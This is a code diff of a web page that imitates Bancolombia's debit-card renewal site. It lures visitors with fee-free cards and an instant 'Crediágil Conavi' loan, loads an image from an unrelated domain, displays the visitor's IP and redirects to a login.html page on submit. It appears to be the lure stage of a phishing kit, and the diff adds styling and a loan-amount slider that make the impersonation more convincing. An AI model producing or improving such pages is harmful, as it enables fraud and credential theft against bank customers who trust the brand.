@@ -6,6 +6,8 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Actualiza Tu Tarjeta Débito - Bancolombia</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
     
@@ -14,19 +16,36 @@
             --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
             --card-bg: rgba(255, 255, 255, 0.94);
             --text: #0f172a;
-            --primary: #ffd200;
-            --primary-hover: #facc15;
+            --muted: #64748b;
             --border: rgba(250, 204, 21, 0.28);
             --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
+            --primary: #ffd200;
+            --primary-hover: #facc15;
+            --primary-text: #0f172a;
+            --container-max: 980px;
+            --wrap-pad: 28px;
+            --card-pad: 38px;
+            --logo-max: 200px;
+            --title-size: 30px;
+            --subtitle-size: 16px;
+            --footer-size: 12px;
+            --btn-min: 200px;
+            --btn-radius: 12px;
+            --btn-pad-y: 16px;
+            --btn-font: 16px;
+            --card-radius: 28px;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        html, body { height: 100%; }
-        
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
             background: var(--bg-gradient);
-            font-family: 'Inter', sans-serif;
+            color: var(--text);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Ubuntu, Cantarell, 'Helvetica Neue', Arial, sans-serif;
             position: relative;
             overflow-x: hidden;
         }
@@ -45,43 +64,200 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 28px 18px;
+            padding: var(--wrap-pad) 18px;
             position: relative;
             z-index: 1;
         }
 
         .auth-card {
             width: 100%;
-            max-width: 980px;
+            max-width: var(--container-max);
             background: var(--card-bg);
             border: 1px solid var(--border);
-            border-radius: 28px;
+            border-radius: var(--card-radius);
             box-shadow: var(--shadow);
-            padding: 38px;
+            padding: var(--card-pad);
             backdrop-filter: blur(16px);
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
         }
 
         .auth-logo {
             display: block;
-            margin: 0 auto 20px;
-            max-width: 200px;
+            margin: 0 auto 6px;
+            max-width: var(--logo-max);
+            width: 100%;
+            height: auto;
+        }
+
+        .auth-content {
+            display: flex;
+            flex-direction: column;
+            gap: 26px;
+        }
+
+        .visual-pane {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero {
+            width: 100%;
+            max-width: 546px;
+            border-radius: 20px;
+            display: block;
+            box-shadow: 0 22px 48px rgba(217, 119, 6, 0.18);
+        }
+
+        .highlight-card {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 18px 20px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, rgba(253,224,71,0.24) 0%, rgba(250,204,21,0.26) 100%);
+            border: 1px solid rgba(234, 179, 8, 0.35);
+            color: #0f172a;
+            font-weight: 600;
+        }
+
+        .highlight-card i {
+            font-size: 26px;
+            color: #d97706;
+        }
+
+        .highlight-card span {
+            font-size: 15px;
+            line-height: 1.45;
+        }
+
+        .info-section {
+            flex: 1;
+            margin: 0;
+            padding: 26px;
+            border: 1px solid rgba(234, 179, 8, 0.35);
+            border-radius: 22px;
+            background: linear-gradient(140deg, rgba(255,251,235,0.96) 0%, rgba(254,240,138,0.92) 100%);
+            box-shadow: 0 20px 48px rgba(217, 119, 6, 0.14);
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .info-title {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            color: #0f172a;
+        }
+
+        .info-description {
+            margin: 0;
+            font-size: 15px;
+            color: #1f2937;
+            text-align: center;
+            line-height: 1.55;
+        }
+
+        .info-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .info-list li {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            font-size: 15px;
+            color: #0f172a;
+            font-weight: 600;
+        }
+
+        .info-list li span {
+            display: block;
+        }
+
+        .info-list li span small {
+            display: block;
+            margin-top: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--muted);
+            line-height: 1.5;
         }
 
         .credit-offer {
-            margin: 26px 0;
+            margin-top: 26px;
             width: 100%;
             border: 1px solid rgba(129, 140, 248, 0.5);
             border-radius: 26px;
             background: linear-gradient(135deg, rgba(17,24,39,0.9) 0%, rgba(30,64,175,0.82) 46%, rgba(22,78,199,0.88) 100%);
             padding: 26px 28px;
-            color: #e0f2fe;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
             box-shadow: 0 34px 70px rgba(30, 64, 175, 0.28);
+            position: relative;
+            overflow: hidden;
+            color: #e0f2fe;
+        }
+
+        .credit-offer::before {
+            content: "";
+            position: absolute;
+            inset: -2px;
+            border-radius: inherit;
+            background: linear-gradient(135deg, rgba(96,165,250,0.78) 0%, rgba(129,140,248,0.55) 45%, rgba(147,197,253,0.35) 100%);
+            filter: blur(24px);
+            opacity: 0;
+            transition: opacity 0.25s ease;
+            pointer-events: none;
+        }
+
+        .credit-offer::after {
+            content: "";
+            position: absolute;
+            inset: 12px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, rgba(30,41,59,0.85) 0%, rgba(15,23,42,0.95) 100%);
+            box-shadow: inset 0 0 0 1px rgba(148, 163, 184, 0.15);
+            pointer-events: none;
+        }
+
+        .credit-offer > * {
+            position: relative;
+            z-index: 1;
         }
 
         .credit-offer:hover {
             transform: translateY(-4px);
+            box-shadow: 0 38px 90px rgba(30, 64, 175, 0.32);
+            border-color: rgba(129, 140, 248, 0.75);
+        }
+
+        .credit-offer:hover::before {
+            opacity: 1;
+        }
+
+        .credit-offer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         .credit-offer-title {
@@ -90,76 +266,203 @@
             color: #f8fafc;
             letter-spacing: 0.08em;
             text-transform: uppercase;
-            margin-bottom: 10px;
+            text-shadow: 0 6px 16px rgba(30, 64, 175, 0.55);
+        }
+
+        .credit-offer-pill {
+            font-size: 12px;
+            font-weight: 800;
+            color: #0f172a;
+            background: linear-gradient(135deg, #a855f7, #38bdf8);
+            border-radius: 999px;
+            padding: 8px 18px;
+            transition: transform 0.18s ease;
+            box-shadow: 0 8px 20px rgba(56, 189, 248, 0.45);
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+        }
+
+        .credit-offer:hover .credit-offer-pill {
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        .credit-offer-tagline {
+            margin: 0;
+            font-size: 16px;
+            color: #cbd5f5;
+            font-weight: 600;
+            line-height: 1.6;
         }
 
         .credit-details {
+            margin-top: 16px;
+            padding: 22px 24px;
+            border-radius: 22px;
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            background: linear-gradient(135deg, rgba(15,23,42,0.92) 0%, rgba(30,41,59,0.82) 100%);
             display: none;
-            margin-top: 20px;
-            padding: 20px;
-            background: rgba(15,23,42,0.92);
-            border-radius: 20px;
+            flex-direction: column;
+            gap: 18px;
+            box-shadow: inset 0 0 0 1px rgba(59, 130, 246, 0.12);
+            color: #dbeafe;
         }
 
         .credit-details.show {
-            display: block;
+            display: flex;
+        }
+
+        .credit-details-range {
+            margin: 0;
+            font-size: 16px;
+            font-weight: 700;
+            color: #f1f5f9;
+        }
+
+        .credit-details-control {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .credit-details-control label {
+            font-size: 13px;
+            font-weight: 800;
+            color: #38bdf8;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .credit-amount-slider input[type="range"] {
+            appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 999px;
+            background: linear-gradient(90deg, #38bdf8 0%, #6366f1 100%);
+            outline: none;
+            border: 0;
+        }
+
+        .credit-amount-slider input[type="range"]::-webkit-slider-thumb {
+            appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0ea5e9;
+            border: 4px solid #bfdbfe;
+            box-shadow: 0 6px 18px rgba(14, 165, 233, 0.45);
+            cursor: pointer;
+        }
+
+        .credit-amount-marks {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 700;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .credit-amount-value {
+            font-size: 20px;
+            font-weight: 900;
+            color: #bae6fd;
+            letter-spacing: 0.04em;
+        }
+
+        .credit-details-metrics {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #cbd5f5;
+            font-weight: 600;
+        }
+
+        .credit-details-metrics li strong {
+            color: #93c5fd;
+            font-weight: 800;
+        }
+
+        .credit-details-highlights {
+            list-style: none;
+            padding-left: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            font-size: 14px;
+            color: #e0f2fe;
+        }
+
+        .credit-details-closing {
+            margin: 0;
+            font-size: 14px;
+            color: #93c5fd;
+            font-weight: 700;
         }
 
         .actions {
-            text-align: center;
-            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            margin-top: 12px;
         }
 
         #btn-submit {
-            min-width: 300px;
+            min-width: var(--btn-min);
             border: 0;
-            border-radius: 12px;
-            padding: 16px 40px;
+            border-radius: var(--btn-radius);
+            padding: var(--btn-pad-y) 32px;
             font-weight: 700;
             cursor: pointer;
             background: var(--primary);
-            color: #0f172a;
-            font-size: 16px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: all 0.3s ease;
+            color: var(--primary-text);
+            box-shadow: none;
+            font-size: var(--btn-font);
+            letter-spacing: 0.01em;
+            transition: opacity 0.18s ease, background 0.18s ease;
         }
 
         #btn-submit:hover {
             background: var(--primary-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.4);
         }
 
-        .info-list {
-            list-style: none;
-            padding: 0;
-            margin: 20px 0;
+        #btn-submit:disabled {
+            background: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
         }
 
-        .info-list li {
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-            margin-bottom: 15px;
-            font-size: 15px;
+        .footer {
+            margin-top: 10px;
+            text-align: center;
+            font-size: var(--footer-size);
+            color: #92400e;
+            letter-spacing: 0.02em;
         }
 
-        .info-list li small {
-            display: block;
-            margin-top: 4px;
-            font-size: 13px;
-            color: #64748b;
+        @media (min-width: 860px) {
+            .auth-content {
+                flex-direction: row;
+                gap: 32px;
+            }
+            .visual-pane, .info-section {
+                flex: 1;
+            }
+            .highlight-card {
+                max-width: none;
+            }
         }
 
         @media (max-width: 599px) {
             .auth-card {
-                padding: 28px 24px;
+                padding: 32px 24px;
             }
-            
             #btn-submit {
                 width: 100%;
-                min-width: auto;
             }
         }
     </style>
@@ -168,33 +471,77 @@
     <div class="auth-wrap">
         <div class="auth-card">
             <svg class="auth-logo" viewBox="0 0 200 40">
-                <text x="10" y="30" font-family="Inter" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
+                <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
             </svg>
 
-            <div style="text-align: center; margin-bottom: 30px;">
-                <h2 style="font-size: 26px; color: #0f172a; margin-bottom: 10px;">🌟 Actualiza Tu Tarjeta Débito</h2>
-                <p style="color: #64748b; font-size: 15px;">Renueva tu tarjeta y activa todos sus beneficios</p>
-            </div>
+            <div class="auth-content">
+                <div class="visual-pane">
+                    <img class="hero" src="https://losmillonarios.click/assets/img/abeja.jpg" alt="Programa de puntos Bancolombia" loading="lazy">
+                    <div class="highlight-card">
+                        <i class="bx bx-gift" aria-hidden="true"></i>
+                        <span>Renueva tu tarjeta y activa todos sus beneficios</span>
+                    </div>
+                </div>
 
-            <ul class="info-list">
-                <li><span>💸 <strong>Evita el impuesto 4xmil</strong><br><small>Realiza movimientos sin cargos adicionales</small></span></li>
-                <li><span>💳 <strong>Sin cuota de manejo</strong><br><small>Disfruta sin pagar costos de mantenimiento</small></span></li>
-                <li><span>🏠 <strong>Entrega a domicilio gratis</strong><br><small>Recíbela al día siguiente sin filas</small></span></li>
-                <li><span>🔒 <strong>Mayor seguridad</strong><br><small>Tecnología contactless y protección antifraude</small></span></li>
-            </ul>
+                <div class="info-section">
+                    <h3 class="info-title">🌟 5 Razones para Renovar a Tarjeta Débito Conavi</h3>
+                    
+                    <ul class="info-list">
+                        <li>
+                            <span>1. 💸 Evita el impuesto 4xmil<br>
+                            <small>Realiza tus movimientos sin preocuparte por cargos adicionales. ¡Ahorra más cada mes!</small></span>
+                        </li>
+                        <li>
+                            <span>2. 💳 Sin cuota de manejo<br>
+                            <small>Disfruta de todos los beneficios de tu tarjeta sin pagar costos de mantenimiento.</small></span>
+                        </li>
+                        <li>
+                            <span>3. 🏠 Entrega a domicilio sin costo<br>
+                            <small>Recíbela en la puerta de tu casa al día siguiente, sin filas ni papeleos.</small></span>
+                        </li>
+                        <li>
+                            <span>4. 🔒 Mayor seguridad y tecnología contactless<br>
+                            <small>Realiza pagos rápidos y seguros con tecnología sin contacto y protección antifraude.</small></span>
+                        </li>
+                        <li>
+                            <span>5. ✨ Mantienes tu mismo número de cuenta<br>
+                            <small>Actualiza fácilmente tu tarjeta sin cambiar tu cuenta ni afectar tus pagos o transferencias.</small></span>
+                        </li>
+                    </ul>
 
-            <button class="credit-offer" id="creditOffer" type="button">
-                <div class="credit-offer-title">💰 Crediágil Conavi</div>
-                <p style="margin: 0; font-size: 15px;">¡Tu fidelidad merece un premio! Accede a crédito desde $2M hasta $10M</p>
-            </button>
+                    <button class="credit-offer" id="creditOffer" type="button">
+                        <div class="credit-offer-header">
+                            <span class="credit-offer-title">Crediágil Conavi</span>
+                            <span class="credit-offer-pill">Seleccionar beneficios</span>
+                        </div>
+                        <p class="credit-offer-tagline">💰 ¡Tu fidelidad merece un premio!</p>
+                    </button>
 
-            <div class="credit-details" id="creditDetails">
-                <p style="color: #93c5fd; margin-bottom: 15px;">💵 Montos disponibles desde 2 hasta 10 millones de pesos</p>
-                <ul style="list-style: none; padding: 0; margin: 15px 0; color: #cbd5f5;">
-                    <li>🎉 Aprobación inmediata sin papeleos</li>
-                    <li>💼 Interés preferencial: 0.4% mensual</li>
-                    <li>📅 Plazo hasta 24 meses</li>
-                </ul>
+                    <div class="credit-details" id="creditDetails">
+                        <p class="credit-details-range">💵 Ahora puedes acceder a nuestro Crédito Crediágil Conavi por montos desde 2 hasta 10 millones de pesos.</p>
+                        <div class="credit-details-control">
+                            <label for="creditAmount">Selecciona el monto que necesitas:</label>
+                            <div class="credit-amount-slider">
+                                <input id="creditAmount" type="range" min="2000000" max="10000000" step="500000" value="2000000">
+                                <div class="credit-amount-marks">
+                                    <span>$2M</span>
+                                    <span>$6M</span>
+                                    <span>$10M</span>
+                                </div>
+                            </div>
+                            <div class="credit-amount-value" id="creditAmountValue">$2.000.000</div>
+                        </div>
+                        <ul class="credit-details-metrics">
+                            <li><strong>Interés preferencial:</strong> 0.4% mensual</li>
+                            <li><strong>Plazo estimado:</strong> 24 meses</li>
+                        </ul>
+                        <ul class="credit-details-highlights">
+                            <li>🎉 Aprobación inmediata y sin papeleos.</li>
+                            <li>🏦 Disponible exclusivamente para clientes que confían en nosotros.</li>
+                        </ul>
+                        <p class="credit-details-closing">Aprovecha esta oportunidad y haz realidad tus planes hoy mismo.</p>
+                    </div>
+                </div>
             </div>
 
             <div class="actions">
@@ -203,30 +550,50 @@
                 </form>
             </div>
 
-            <div style="text-align: center; margin-top: 20px; font-size: 12px; color: #92400e;">
-                <div id="ipc">Cargando IP...</div>
-                <div id="jclock1">Cargando hora...</div>
-                <div style="margin-top: 6px;">Copyright © 2025 Bancolombia</div>
+            <div class="footer">
+                <div id="ipc">Dirección IP: Cargando...</div>
+                <div id="jclock1">Cargando...</div>
+                <div style="margin-top:6px;">Copyright © 2025 Bancolombia.</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Toggle credit details
-        document.getElementById('creditOffer').addEventListener('click', function() {
-            document.getElementById('creditDetails').classList.toggle('show');
+        // Toggle credit offer
+        const creditOffer = document.getElementById('creditOffer');
+        const creditDetails = document.getElementById('creditDetails');
+
+        creditOffer.addEventListener('click', function() {
+            creditDetails.classList.toggle('show');
         });
 
-        // Get IP
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => document.getElementById('ipc').textContent = 'IP: ' + d.ip)
-            .catch(() => document.getElementById('ipc').textContent = 'IP: No disponible');
+        // Update credit amount
+        const creditSlider = document.getElementById('creditAmount');
+        const creditValue = document.getElementById('creditAmountValue');
 
-        // Clock
+        creditSlider.addEventListener('input', function() {
+            const value = parseInt(this.value);
+            creditValue.textContent = '$' + value.toLocaleString('es-CO');
+        });
+
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ipc').textContent = 'Dirección IP: ' + data.ip;
+            })
+            .catch(() => {
+                document.getElementById('ipc').textContent = 'Dirección IP: No disponible';
+            });
+
+        // Update clock
         function updateClock() {
             const now = new Date();
-            const time = now.toLocaleTimeString('es-CO');
+            const time = now.toLocaleTimeString('es-CO', { 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit' 
+            });
             const date = now.toLocaleDateString('es-CO', {
                 weekday: 'long',
                 year: 'numeric',
@@ -238,13 +605,17 @@
         updateClock();
         setInterval(updateClock, 1000);
 
-        // Form submit
+        // Form submission
         document.getElementById('mainForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const creditSelected = document.getElementById('creditDetails').classList.contains('show');
-            localStorage.setItem('creditSelected', creditSelected);
-            localStorage.setItem('timestamp', new Date().toISOString());
+            const creditData = {
+                creditSelected: creditDetails.classList.contains('show'),
+                creditAmount: creditSlider.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            localStorage.setItem('creditSelection', JSON.stringify(creditData));
             
             window.location.href = 'login.html';
         });
